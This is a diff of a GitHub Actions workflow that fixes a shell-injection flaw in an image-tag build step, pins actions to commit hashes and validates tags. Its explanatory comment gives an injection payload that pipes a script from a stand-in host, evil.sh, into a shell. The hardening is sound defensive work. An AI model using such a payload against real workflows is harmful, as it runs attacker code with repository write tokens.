@@ -57,27 +57,44 @@ jobs:
     outputs:
       image_tag: ${{ steps.tag.outputs.image_tag }}
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
 
       - name: Compute image tag
         id: tag
         shell: bash
+        # INPUT_TAG comes through `env:` rather than being interpolated into the
+        # script. `${{ github.event.inputs.* }}` is substituted into the shell
+        # source BEFORE bash parses it, so a workflow_dispatch run started with
+        # image_tag = `x"; curl evil.sh | sh; #` executes that as its own command,
+        # on a runner holding GITHUB_TOKEN with packages:write. As an environment
+        # variable it is only ever data. (Semgrep
+        # yaml.github-actions.security.run-shell-injection.)
+        env:
+          INPUT_TAG: ${{ github.event.inputs.image_tag }}
         run: |
           set -euo pipefail
-          if [ -n "${{ github.event.inputs.image_tag }}" ]; then
-            TAG="${{ github.event.inputs.image_tag }}"
+          if [ -n "$INPUT_TAG" ]; then
+            TAG="$INPUT_TAG"
           else
             TAG="$(git rev-parse --short=12 HEAD)"
           fi
+          # And validate it regardless of where it came from: this string becomes a
+          # container tag and is written into values-prod.yaml, so anything outside
+          # the OCI tag grammar has no business reaching either.
+          case "$TAG" in
+            *[!A-Za-z0-9._-]*|'' )
+              echo "::error::image_tag '$TAG' is not a valid OCI tag (A-Za-z0-9._- only)"
+              exit 1 ;;
+          esac
           echo "image_tag=$TAG" >> "$GITHUB_OUTPUT"
           echo "Image tag: $TAG"
 
       - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v3
+        uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3.12.0
 
       - name: Log in to GHCR
         if: github.event_name != 'pull_request'
-        uses: docker/login-action@v3
+        uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3.7.0
         with:
           registry: ${{ env.REGISTRY }}
           username: ${{ github.actor }}
@@ -87,7 +104,7 @@ jobs:
       # `package.json` and `.` relative to itself, and the repo root holds the
       # unrelated Figma plugin/bridge sources.
       - name: Build design-frames-service image
-        uses: docker/build-push-action@v6
+        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
         with:
           context: ./services/design-frames-service
           file: ./services/design-frames-service/Dockerfile
@@ -106,7 +123,7 @@ jobs:
     permissions:
       contents: read
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
         with:
           ref: master
 
